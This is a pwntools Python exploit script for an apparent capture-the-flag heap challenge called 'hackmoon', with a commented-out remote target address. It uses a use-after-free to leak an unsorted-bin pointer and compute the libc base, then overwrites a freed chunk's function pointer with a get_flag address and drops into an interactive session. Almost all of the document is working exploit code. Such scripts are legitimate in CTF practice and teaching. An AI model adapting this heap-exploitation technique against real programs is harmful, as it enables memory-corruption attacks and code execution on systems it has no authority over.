from pwn import *

p = process('./hackmoon')
#p = remote('101.71.29.5',10016)
elf = ELF('./hackmoon')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
def add(size, content):
    print p.recvuntil('Your choice :')
    p.sendline('1')
    print p.recvuntil('moon size :')
    p.sendline(str(size))
    print p.recvuntil('Content :')
    p.send(content)


def delete(index, ):
    print p.recvuntil('Your choice :')
    p.sendline('2')
    print p.recvuntil('Index :')
    p.sendline(str(index))
    print p.recvuntil('Success\n')
    return


def print_(index):
    print p.recvuntil('Your choice :')
    p.sendline('3')
    print p.recvuntil('Index :')
    p.sendline(str(index))
    return


add(0x80,'000000')
add(0x20,'1111111') 
delete(0)
add(0x80,'2222')

print_(2)
print p.recvuntil('2222')
unsorted_bin =  p.recv(4)
unsorted_bin = u32(unsorted_bin)
print 'unsorted_bin: ',hex(unsorted_bin)

libc_base = unsorted_bin -  0x1b27b0 
print 'libc_base: ', hex(libc_base)
system_addr = 0x08048994
get_flag = 0x8048986 
add(0x20,'333')
delete(1)
delete(3)
add(0x8,p32(get_flag)+';shx00')
#gdb.attach(p,'b *%s' % system_addr)
print_(1)
p.interactive()

